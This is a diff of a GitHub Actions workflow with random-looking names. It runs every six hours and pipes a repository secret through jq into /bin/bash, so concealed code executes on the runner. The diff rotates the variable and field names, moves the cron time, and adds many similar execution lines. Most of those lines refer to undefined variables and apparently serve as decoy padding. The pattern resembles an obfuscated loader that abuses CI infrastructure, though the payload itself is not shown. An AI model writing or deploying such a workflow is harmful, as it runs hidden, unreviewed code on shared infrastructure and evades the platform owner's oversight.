@@ -1,22 +1,31 @@
 name: wangyinzi1234
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
+    - cron: '28 4/6 * * *'
 
-jobs:  # 3277
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangyinzi1234
         env:
-          uvr7606: ${{ secrets.uvr7606 }}
+          dco404: ${{ secrets.dco404 }}
         run: |
-          echo $uvr7606 | jq -r .sop8960 | /bin/bash
-          echo $h70 | jq -r .d283 | /bin/bash
-          echo $rwx9 | jq -r .esul827 | /bin/bash
-          echo $j447 | jq -r .gskav4 | /bin/bash
-          echo $f13 | jq -r .aug76625 | /bin/bash
+          echo $dco404 | jq -r .ezya7 | /bin/bash
+          echo $k74 | jq -r .qf3 | /bin/bash
+          echo $ytok053 | jq -r .hhf9344 | /bin/bash
+          echo $wk2 | jq -r .b525 | /bin/bash
+          echo $zkrr5 | jq -r .bw21582 | /bin/bash
+          echo $v6074 | jq -r .feu96407 | /bin/bash
+          echo $nozlr62 | jq -r .xtept90625 | /bin/bash
+          echo $vwvih11890 | jq -r .vmqkp4487 | /bin/bash
+          echo $hcs0032 | jq -r .pdadm87102 | /bin/bash
+          echo $u74393 | jq -r .pp5043 | /bin/bash
+          echo $e080 | jq -r .yasux56 | /bin/bash
+          echo $oiaxy8441 | jq -r .w47 | /bin/bash
+          echo $wet9 | jq -r .hdwsz12 | /bin/bash
+          echo $qajh3761 | jq -r .oysqu9217 | /bin/bash
 
